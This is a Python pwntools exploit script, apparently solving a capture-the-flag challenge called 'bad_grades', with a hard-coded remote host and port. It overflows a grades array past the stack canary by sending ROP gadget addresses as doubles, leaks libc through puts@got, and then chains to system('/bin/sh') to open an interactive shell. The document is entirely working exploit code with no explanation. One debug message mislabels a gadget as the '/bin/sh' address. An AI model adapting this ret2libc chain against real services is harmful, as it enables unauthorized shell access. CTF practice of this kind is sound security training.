from pwn import *
import os
import sys


elf = ELF('./bad_grades')
rop = ROP(elf)
if ("remote" in sys.argv):
    p = remote("94.237.48.59", 31666)
    libc = ELF('./libc.so.6')

else:   
    p = process(elf.path)
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')





def debug():
    gdb.attach(p, gdbscript='''
        break system
    ''')

def pointer_to_double(pointer_value):
    byte_string = p64(pointer_value)
    hex_str = binascii.hexlify(byte_string)
    byte_data = binascii.unhexlify(hex_str)
    x = struct.unpack('d', byte_data)
    return (str(x[0]).encode())

def prepare_rop(len):
    p.recvline()
    p.sendline(b"2") # Menu choice
    p.recvline()
    p.sendline(str(len)) # Nbr of grades
    p.sendline((b"0.0\n")  * array_offset)
    p.sendline(b".")

def send_ropchain(array):
    for i in range(len(array)):
        p.sendline(pointer_to_double(array[i]))


def format_addr(addr):
    addr = addr.strip()
    addr = u64(addr.ljust(8, b"\x00"))
    return (addr)

def leak_addr(func):
    leak_ropchain = [
        rop.ret[0],
        rop.rdi[0],
        elf.got['puts'],  # puts@got
        elf.plt['puts'],
        0x00401108 # return to main
    ]
    prepare_rop(len(leak_ropchain) + array_offset + canary_offset)
    send_ropchain(leak_ropchain)
    p.recvuntil(b"Your new average is:")
    p.recvline()
    leak = p.recvline() 
    leak = format_addr(leak)
    libc.address = leak - libc.sym['puts']
    success(f"Libc base address : {hex(libc.address)}")

def exploit():
    exploit_ropchain = [
        rop.ret[0],
        rop.rdi[0],
        next(libc.search(b'/bin/sh')),
        libc.sym['system'],
    ]
    prepare_rop(array_offset + canary_offset + len(exploit_ropchain) + 1)
    p.sendline(b"0.0") 
    info("Sending payload...")
    info(f"System : {hex(exploit_ropchain[2])}")
    info(f"/bin/sh: {hex(exploit_ropchain[1])}")
    send_ropchain(exploit_ropchain)
    p.interactive()






# Filling array
array_offset= 33

# Stack Smashing at 34
canary_offset = 1

if ("debug" in sys.argv and not "remote" in sys.argv):
    debug()
leak_addr(elf.got['puts'])
exploit()


